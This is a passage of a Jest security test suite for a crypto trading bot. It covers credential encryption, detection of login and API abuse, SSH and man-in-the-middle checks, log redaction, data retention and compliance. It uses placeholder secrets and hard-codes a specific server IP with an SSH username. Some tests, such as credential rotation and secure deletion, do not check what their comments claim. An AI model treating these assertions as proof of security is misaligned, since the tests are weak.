expect(encryptedSecretKey).not.toBe(testCredentials.secretKey);\r\n      expect(encryptedPassphrase).not.toBe(testCredentials.passphrase);\r\n\r\n      // Verify credentials can be decrypted correctly\r\n      const decryptedApiKey = await credentialManager.decryptCredential(encryptedApiKey);\r\n      const decryptedSecretKey = await credentialManager.decryptCredential(encryptedSecretKey);\r\n      const decryptedPassphrase = await credentialManager.decryptCredential(encryptedPassphrase);\r\n\r\n      expect(decryptedApiKey).toBe(testCredentials.apiKey);\r\n      expect(decryptedSecretKey).toBe(testCredentials.secretKey);\r\n      expect(decryptedPassphrase).toBe(testCredentials.passphrase);\r\n    });\r\n\r\n    it('should validate credential rotation security', async () => {\r\n      const originalCredential = 'original_api_key_12345';\r\n      const newCredential = 'new_api_key_67890';\r\n\r\n      // Encrypt original credential\r\n      const encryptedOriginal = await credentialManager.encryptCredential(originalCredential);\r\n\r\n      // Rotate to new credential\r\n      const encryptedNew = await credentialManager.encryptCredential(newCredential);\r\n\r\n      // Verify old credential cannot be used to decrypt new credential\r\n      try {\r\n        await credentialManager.decryptCredential(encryptedNew);\r\n        // Should succeed with correct decryption\r\n      } catch (error) {\r\n        fail('Should be able to decrypt new credential');\r\n      }\r\n\r\n      // Verify credentials are different\r\n      expect(encryptedOriginal).not.toBe(encryptedNew);\r\n      \r\n      const decryptedOriginal = await credentialManager.decryptCredential(encryptedOriginal);\r\n      const decryptedNew = await credentialManager.decryptCredential(encryptedNew);\r\n      \r\n      expect(decryptedOriginal).toBe(originalCredential);\r\n      expect(decryptedNew).toBe(newCredential);\r\n      expect(decryptedOriginal).not.toBe(decryptedNew);\r\n    });\r\n  });\r\n\r\n  describe('Threat Detection and Response Testing', () => {\r\n    it('should detect suspicious login patterns', async () => {\r\n      const suspiciousActivities = [\r\n        // Multiple failed login attempts\r\n        { type: 'LOGIN_ATTEMPT', success: false, ip: '192.168.1.100', timestamp: new Date() },\r\n        { type: 'LOGIN_ATTEMPT', success: false, ip: '192.168.1.100', timestamp: new Date() },\r\n        { type: 'LOGIN_ATTEMPT', success: false, ip: '192.168.1.100', timestamp: new Date() },\r\n        { type: 'LOGIN_ATTEMPT', success: false, ip: '192.168.1.100', timestamp: new Date() },\r\n        { type: 'LOGIN_ATTEMPT', success: false, ip: '192.168.1.100', timestamp: new Date() },\r\n        \r\n        // Login from unusual location\r\n        { type: 'LOGIN_ATTEMPT', success: true, ip: '1.2.3.4', timestamp: new Date() },\r\n        \r\n        // Login at unusual time\r\n        { type: 'LOGIN_ATTEMPT', success: true, ip: '192.168.1.100', timestamp: new Date(Date.now() - 3 * 60 * 60 * 1000) } // 3 AM\r\n      ];\r\n\r\n      let threatsDetected = 0;\r\n\r\n      for (const activity of suspiciousActivities) {\r\n        const threatLevel = await threatDetection.analyzeActivity(activity);\r\n        \r\n        if (threatLevel > 50) { // Threshold for suspicious activity\r\n          threatsDetected++;\r\n        }\r\n      }\r\n\r\n      // Should detect multiple threats\r\n      expect(threatsDetected).toBeGreaterThan(0);\r\n    });\r\n\r\n    it('should detect API abuse patterns', async () => {\r\n      const apiActivities = [];\r\n      const currentTime = Date.now();\r\n\r\n      // Generate high-frequency API requests (potential abuse)\r\n      for (let i = 0; i < 100; i++) {\r\n        apiActivities.push({\r\n          type: 'API_REQUEST',\r\n          endpoint: '/api/v4/spot/orders',\r\n          ip: '192.168.1.100',\r\n          timestamp: new Date(currentTime + i * 100), // 100ms intervals\r\n          responseTime: 50 + Math.random() * 100\r\n        });\r\n      }\r\n\r\n      const abuseDetected = await threatDetection.detectAPIAbuse(apiActivities);\r\n\r\n      expect(abuseDetected).toBeDefined();\r\n      expect(typeof abuseDetected.isAbuse).toBe('boolean');\r\n      expect(typeof abuseDetected.riskScore).toBe('number');\r\n      expect(abuseDetected.riskScore).toBeGreaterThanOrEqual(0);\r\n      expect(abuseDetected.riskScore).toBeLessThanOrEqual(100);\r\n\r\n      // High-frequency requests should be flagged as potential abuse\r\n      if (abuseDetected.isAbuse) {\r\n        expect(abuseDetected.riskScore).toBeGreaterThan(70);\r\n        expect(abuseDetected.reasons).toContain('HIGH_FREQUENCY_REQUESTS');\r\n      }\r\n    });\r\n\r\n    it('should respond to security incidents automatically', async () => {\r\n      const securityIncident = {\r\n        type: 'BRUTE_FORCE_ATTACK',\r\n        severity: 'HIGH',\r\n        source: '192.168.1.100',\r\n        details: {\r\n          failedAttempts: 10,\r\n          timeWindow: 300000, // 5 minutes\r\n          targetEndpoint: '/api/auth/login'\r\n        },\r\n        timestamp: new Date()\r\n      };\r\n\r\n      const response = await incidentResponse.handleSecurityIncident(securityIncident);\r\n\r\n      expect(response).toBeDefined();\r\n      expect(response.incidentId).toBeDefined();\r\n      expect(response.responseActions).toBeDefined();\r\n      expect(Array.isArray(response.responseActions)).toBe(true);\r\n      expect(response.responseActions.length).toBeGreaterThan(0);\r\n\r\n      // Should include appropriate response actions\r\n      const actionTypes = response.responseActions.map(action => action.type);\r\n      expect(actionTypes).toContain('BLOCK_IP');\r\n      expect(actionTypes).toContain('ALERT_ADMINISTRATORS');\r\n    });\r\n\r\n    it('should maintain audit trail integrity', async () => {\r\n      const testEvents = [\r\n        {\r\n          type: 'USER_LOGIN',\r\n          userId: 'admin',\r\n          ip: '192.168.1.100',\r\n          timestamp: new Date(),\r\n          success: true\r\n        },\r\n        {\r\n          type: 'API_KEY_ROTATION',\r\n          userId: 'system',\r\n          details: { keyId: 'gate_io_api_key' },\r\n          timestamp: new Date(),\r\n          success: true\r\n        },\r\n        {\r\n          type: 'TRADE_EXECUTION',\r\n          userId: 'trading_bot',\r\n          details: { symbol: 'BTC/USDT', amount: 0.1, price: 42000 },\r\n          timestamp: new Date(),\r\n          success: true\r\n        }\r\n      ];\r\n\r\n      const auditEntries = [];\r\n\r\n      for (const event of testEvents) {\r\n        const auditEntry = await auditService.logSecurityEvent(event);\r\n        auditEntries.push(auditEntry);\r\n      }\r\n\r\n      // Verify audit trail integrity\r\n      for (let i = 0; i < auditEntries.length; i++) {\r\n        const entry = auditEntries[i];\r\n        \r\n        expect(entry.id).toBeDefined();\r\n        expect(entry.hash).toBeDefined();\r\n        expect(entry.timestamp).toBeInstanceOf(Date);\r\n        \r\n        // Verify hash integrity\r\n        const calculatedHash = await auditService.calculateEventHash(testEvents[i]);\r\n        expect(entry.hash).toBe(calculatedHash);\r\n        \r\n        // Verify chronological order\r\n        if (i > 0) {\r\n          expect(entry.timestamp.getTime()).toBeGreaterThanOrEqual(\r\n            auditEntries[i - 1].timestamp.getTime()\r\n          );\r\n        }\r\n      }\r\n    });\r\n  });\r\n\r\n  describe('Network Security Testing', () => {\r\n    it('should validate SSH tunnel security', async () => {\r\n      const tunnelConfig = {\r\n        host: '168.138.104.117',\r\n        port: 22,\r\n        username: 'ubuntu',\r\n        privateKeyPath: '/path/to/secure/key',\r\n        localPort: 8080,\r\n        remotePort: 80,\r\n        encryption: 'aes256-ctr',\r\n        compression: true,\r\n        keepAlive: true\r\n      };\r\n\r\n      // Validate tunnel configuration security\r\n      const securityValidation = await securityMonitoring.validateTunnelSecurity(tunnelConfig);\r\n\r\n      expect(securityValidation).toBeDefined();\r\n      expect(typeof securityValidation.isSecure).toBe('boolean');\r\n      expect(Array.isArray(securityValidation.securityIssues)).toBe(true);\r\n      expect(Array.isArray(securityValidation.recommendations)).toBe(true);\r\n\r\n      // Check for common security issues\r\n      const hasWeakEncryption = securityValidation.securityIssues.some(\r\n        issue => issue.includes('weak encryption')\r\n      );\r\n      const hasInsecurePort = securityValidation.securityIssues.some(\r\n        issue => issue.includes('insecure port')\r\n      );\r\n\r\n      // Should not have critical security issues\r\n      expect(hasWeakEncryption).toBe(false);\r\n      expect(hasInsecurePort).toBe(false);\r\n    });\r\n\r\n    it('should detect man-in-the-middle attacks', async () => {\r\n      const networkTraffic = [\r\n        {\r\n          source: '192.168.1.100',\r\n          destination: '168.138.104.117',\r\n          port: 22,\r\n          protocol: 'SSH',\r\n          encrypted: true,\r\n          certificateValid: true,\r\n          timestamp: new Date()\r\n        },\r\n        {\r\n          source: '192.168.1.100',\r\n          destination: '168.138.104.117',\r\n          port: 22,\r\n          protocol: 'SSH',\r\n          encrypted: true,\r\n          certificateValid: false, // Suspicious\r\n          timestamp: new Date()\r\n        },\r\n        {\r\n          source: '192.168.1.100',\r\n          destination: '10.0.0.1', // Unexpected destination\r\n          port: 22,\r\n          protocol: 'SSH',\r\n          encrypted: false, // Unencrypted\r\n          certificateValid: false,\r\n          timestamp: new Date()\r\n        }\r\n      ];\r\n\r\n      let mitmsDetected = 0;\r\n\r\n      for (const traffic of networkTraffic) {\r\n        const mitm = await threatDetection.detectManInTheMiddle(traffic);\r\n        \r\n        if (mitm.detected) {\r\n          mitmsDetected++;\r\n          expect(mitm.riskLevel).toBeGreaterThan(50);\r\n          expect(mitm.indicators).toBeDefined();\r\n          expect(Array.isArray(mitm.indicators)).toBe(true);\r\n        }\r\n      }\r\n\r\n      // Should detect suspicious traffic\r\n      expect(mitmsDetected).toBeGreaterThan(0);\r\n    });\r\n\r\n    it('should validate API endpoint security', async () => {\r\n      const apiEndpoints = [\r\n        { url: 'https://api.gateio.ws/api/v4/spot/time', method: 'GET', requiresAuth: false },\r\n        { url: 'https://api.gateio.ws/api/v4/spot/accounts', method: 'GET', requiresAuth: true },\r\n        { url: 'https://api.gateio.ws/api/v4/spot/orders', method: 'POST', requiresAuth: true },\r\n        { url: 'http://insecure-api.com/data', method: 'GET', requiresAuth: false } // Insecure\r\n      ];\r\n\r\n      const securityResults = [];\r\n\r\n      for (const endpoint of apiEndpoints) {\r\n        const security = await securityMonitoring.validateEndpointSecurity(endpoint);\r\n        securityResults.push(security);\r\n      }\r\n\r\n      // Validate security results\r\n      securityResults.forEach((result, index) => {\r\n        expect(result).toBeDefined();\r\n        expect(typeof result.isSecure).toBe('boolean');\r\n        expect(Array.isArray(result.vulnerabilities)).toBe(true);\r\n        \r\n        const endpoint = apiEndpoints[index];\r\n        \r\n        // HTTPS endpoints should be more secure\r\n        if (endpoint.url.startsWith('https://')) {\r\n          expect(result.isSecure).toBe(true);\r\n        } else {\r\n          expect(result.isSecure).toBe(false);\r\n          expect(result.vulnerabilities).toContain('INSECURE_PROTOCOL');\r\n        }\r\n      });\r\n    });\r\n  });\r\n\r\n  describe('Data Protection and Privacy Testing', () => {\r\n    it('should protect sensitive data in logs', async () => {\r\n      const sensitiveData = {\r\n        apiKey: 'gate_io_api_key_12345',\r\n        secretKey: 'gate_io_secret_key_67890',\r\n        privateKey: '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...',\r\n        password: 'super_secret_password',\r\n        creditCard: '4111-1111-1111-1111',\r\n        ssn: '123-45-6789'\r\n      };\r\n\r\n      const logEntry = {\r\n        level: 'INFO',\r\n        message: 'User authentication successful',\r\n        data: sensitiveData,\r\n        timestamp: new Date()\r\n      };\r\n\r\n      const sanitizedLog = await auditService.sanitizeLogEntry(logEntry);\r\n\r\n      expect(sanitizedLog).toBeDefined();\r\n      expect(sanitizedLog.message).toBe(logEntry.message);\r\n      expect(sanitizedLog.timestamp).toBe(logEntry.timestamp);\r\n\r\n      // Sensitive data should be redacted\r\n      expect(sanitizedLog.data.apiKey).not.toBe(sensitiveData.apiKey);\r\n      expect(sanitizedLog.data.secretKey).not.toBe(sensitiveData.secretKey);\r\n      expect(sanitizedLog.data.privateKey).not.toBe(sensitiveData.privateKey);\r\n      expect(sanitizedLog.data.password).not.toBe(sensitiveData.password);\r\n      expect(sanitizedLog.data.creditCard).not.toBe(sensitiveData.creditCard);\r\n      expect(sanitizedLog.data.ssn).not.toBe(sensitiveData.ssn);\r\n\r\n      // Should contain redaction indicators\r\n      expect(sanitizedLog.data.apiKey).toContain('***');\r\n      expect(sanitizedLog.data.secretKey).toContain('***');\r\n      expect(sanitizedLog.data.password).toContain('***');\r\n    });\r\n\r\n    it('should implement secure data deletion', async () => {\r\n      const testData = 'sensitive_data_to_be_deleted';\r\n      const encrypted = await new EncryptionService().encryptData(testData);\r\n\r\n      // Store data reference\r\n      const dataReference = {\r\n        id: 'test_data_123',\r\n        encryptedData: encrypted,\r\n        createdAt: new Date(),\r\n        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000) // 24 hours\r\n      };\r\n\r\n      // Secure deletion\r\n      const deletionResult = await securityMonitoring.secureDataDeletion(dataReference);\r\n\r\n      expect(deletionResult).toBeDefined();\r\n      expect(deletionResult.deleted).toBe(true);\r\n      expect(deletionResult.overwritePasses).toBeGreaterThan(0);\r\n      expect(deletionResult.verificationPassed).toBe(true);\r\n\r\n      // Verify data is actually deleted and unrecoverable\r\n      try {\r\n        await new EncryptionService().decryptData(dataReference.encryptedData);\r\n        fail('Data should not be recoverable after secure deletion');\r\n      } catch (error) {\r\n        // Expected - data should be unrecoverable\r\n      }\r\n    });\r\n\r\n    it('should validate data retention policies', async () => {\r\n      const testDataItems = [\r\n        { id: '1', type: 'TRADE_LOG', createdAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000), retention: 90 }, // 30 days old, 90 day retention\r\n        { id: '2', type: 'AUDIT_LOG', createdAt: new Date(Date.now() - 100 * 24 * 60 * 60 * 1000), retention: 365 }, // 100 days old, 365 day retention\r\n        { id: '3', type: 'TEMP_DATA', createdAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000), retention: 1 }, // 2 days old, 1 day retention\r\n        { id: '4', type: 'USER_DATA', createdAt: new Date(Date.now() - 400 * 24 * 60 * 60 * 1000), retention: 365 } // 400 days old, 365 day retention\r\n      ];\r\n\r\n      const retentionCheck = await securityMonitoring.checkDataRetention(testDataItems);\r\n\r\n      expect(retentionCheck).toBeDefined();\r\n      expect(Array.isArray(retentionCheck.itemsToDelete)).toBe(true);\r\n      expect(Array.isArray(retentionCheck.itemsToKeep)).toBe(true);\r\n\r\n      // Items 3 and 4 should be marked for deletion (exceeded retention)\r\n      const idsToDelete = retentionCheck.itemsToDelete.map(item => item.id);\r\n      expect(idsToDelete).toContain('3'); // Temp data exceeded 1 day retention\r\n      expect(idsToDelete).toContain('4'); // User data exceeded 365 day retention\r\n\r\n      // Items 1 and 2 should be kept\r\n      const idsToKeep = retentionCheck.itemsToKeep.map(item => item.id);\r\n      expect(idsToKeep).toContain('1'); // Trade log within 90 day retention\r\n      expect(idsToKeep).toContain('2'); // Audit log within 365 day retention\r\n    });\r\n  });\r\n\r\n  describe('Compliance and Regulatory Testing', () => {\r\n    it('should validate GDPR compliance', async () => {\r\n      const gdprRequirements = {\r\n        dataMinimization: true,\r\n        consentManagement: true,\r\n        rightToErasure: true,\r\n        dataPortability: true,\r\n        privacyByDesign: true,\r\n        dataProtectionOfficer: true,\r\n        breachNotification: true\r\n      };\r\n\r\n      const complianceCheck = await securityMonitoring.checkGDPRCompliance(gdprRequirements);\r\n\r\n      expect(complianceCheck).toBeDefined();\r\n      expect(typeof complianceCheck.compliant).toBe('boolean');\r\n      expect(Array.isArray(complianceCheck.violations)).toBe(true);\r\n      expect(Array.isArray(complianceCheck.recommendations)).toBe(true);\r\n\r\n      // Should meet basic GDPR requirements\r\n      expect(complianceCheck.compliant).toBe(true);\r\n      expect(complianceCheck.violations.length).toBe(0);\r\n    });\r\n\r\n    it('should validate financial data protection standards', async () => {\r\n      const financialDataTypes = [\r\n        { type: 'TRADING_ACCOUNT', encrypted: true, accessControlled: true, audited: true },\r\n        { type: 'API_CREDENTIALS', encrypted: true, accessControlled: true, audited: true },\r\n        { type: 'TRANSACTION_HISTORY', encrypted: true, accessControlled: true, audited: true },\r\n        { type: 'BALANCE_INFO', encrypted: false, accessControlled: true, audited: true }, // Violation\r\n        { type: 'USER_PROFILE', encrypted: true, accessControlled: false, audited: true } // Violation\r\n      ];\r\n\r\n      let violations = 0;\r\n      const complianceResults = [];\r\n\r\n      for (const dataType of financialDataTypes) {\r\n        const compliance = await securityMonitoring.validateFinancialDataProtection(dataType);\r\n        complianceResults.push(compliance);\r\n        \r\n        if (!compliance.compliant) {\r\n          violations++;\r\n        }\r\n      }\r\n\r\n      // Should detect violations\r\n      expect(violations).toBe(2); // BALANCE_INFO and USER_PROFILE violations\r\n      \r\n      // Validate specific compliance results\r\n      expect(complianceResults[3].compliant).toBe(false); // BALANCE_INFO\r\n      expect(complianceResults[3].violations).toContain('UNENCRYPTED_FINANCIAL_DATA');\r\n      \r\n      expect(complianceResults[4].compliant).toBe(false); // USER_PROFILE\r\n      expect(complianceResults[4].violations).toContain('INSUFFICIENT_ACCESS_CONTROL');\r\n    });\r\n\r\n    it('should validate audit trail completeness', async () => {\r\n      const auditEvents = [\r\n        { type: 'USER_LOGIN', timestamp: new Date(), userId: 'admin', logged: true },\r\n        { type: 'TRADE_EXECUTION', timestamp: new Date(), userId: 'bot', logged: true },\r\n        { type: 'API_KEY_ACCESS', timestamp: new Date(), userId: 'system', logged: false }, // Missing\r\n        { type: 'DATA_EXPORT', timestamp: new Date(), userId: 'admin', logged: true },\r\n        { type: 'CONFIGURATION_CHANGE', timestamp: new Date(), userId: 'admin', logged: false } // Missing\r\n      ];\r\n\r\n      const auditCompleteness = await auditService.validateAuditCompleteness(auditEvents);\r\n\r\n      expect(auditCompleteness).toBeDefined();\r\n      expect(typeof auditCompleteness.completenessScore).toBe('number');\r\n      expect(auditCompleteness.completenessScore).toBeGreaterThanOrEqual(0);\r\n      expect(auditCompleteness.completenessScore).toBeLessThanOrEqual(100);\r\n      expect(Array.isArray(auditCompleteness.missingEvents)).toBe(true);\r\n\r\n      // Should detect missing audit events\r\n      expect(auditCompleteness.missingEvents.length).toBe(2);\r\n      expect(auditCompleteness.missingEvents).toContain('API_KEY_ACCESS');\r\n      expect(auditCompleteness.missingEvents).toContain('CONFIGURATION_CHANGE');\r\n      \r\n      // Completeness score should reflect missing events\r\n      expect(auditCompleteness.completenessScore).toBe(60); // 3/5 events logged = 60%\r\n    });\r\n  });\r\n\r\n  describe('Security Performance Testing', () => {\r\n    it('should maintain security under high load', async () => {\r\n      const concurrentSecurityOperations = [];\r\n      const operationCount = 50;\r\n\r\n      // Create concurrent security operations\r\n      for (let i = 0; i < operationCount; i++) {\r\n        concurrentSecurityOperations.push(\r\n          threatDetection.analyzeActivity({\r\n            type: 'API_REQUEST',\r\n            ip: `192.168.1.${100 + (i % 50)}`,\r\n            timestamp: new Date(),\r\n            endpoint: '/api/v4/spot/orders'\r\n          })\r\n        );\r\n      }\r\n\r\n      const startTime = Date.now();\r\n      const results = await Promise.all(concurrentSecurityOperations);\r\n      const endTime = Date.now();\r\n      const totalTime = endTime - startTime;\r\n\r\n      // Validate results\r\n      expect(results.length).toBe(operationCount);\r\n      results.forEach(result => {\r\n        expect(typeof result).toBe('number');\r\n        expect(result).toBeGreaterThanOrEqual(0);\r\n        expect(result).toBeLessThanOrEqual(100);\r\n      });\r\n\r\n      // Should complete within reasonable time (less than 5 seconds)\r\n      expect(totalTime).toBeLessThan(5000);\r\n\r\n      // Calculate average processing time per operation\r\n      const avgProcessingTime = totalTime / operationCount;\r\n      expect(avgProcessingTime).toBeLessThan(100); // Less than 100ms per operation\r\n    });\r\n\r\n    it('should handle security event bursts', async () => {\r\n      const burstEvents = [];\r\n      const burstSize = 100;\r\n      const burstTimeWindow = 1000; // 1 second\r\n\r\n      // Generate burst of security events\r\n      for (let i = 0; i < burstSize; i++) {\r\n        burstEvents.push({\r\n          type: 'LOGIN_ATTEMPT',\r\n          success: Math.random() > 0.7, // 30% failure rate\r\n          ip: `192.168.1.${100 + (i % 10)}`,\r\n          timestamp: new Date(Date.now() + (i * burstTimeWindow / burstSize))\r\n        });\r\n      }\r\n\r\n      const burstStartTime = Date.now();\r\n      const processedEvents = [];\r\n\r\n      for (const event of burstEvents) {\r\n        const processed = await securityMonitoring.processSecurityEvent(event);\r\n        processedEvents.push(processed);\r\n      }\r\n\r\n      const burstEndTime = Date.now();\r\n      const burstProcessingTime = burstEndTime - burstStartTime;\r\n\r\n      // Validate burst processing\r\n      expect(processedEvents.length).toBe(burstSize);\r\n      expect(burstProcessingTime).toBeLessThan(10000); // Less than 10 seconds\r\n\r\n      // Should detect patterns in burst\r\n      const threatDetections = processedEvents.filter(event => event.threatLevel > 50);\r\n      expect(threatDetections.length).toBeGreaterThan(0);\r\n    });\r\n  });\r\n});"],"version":3}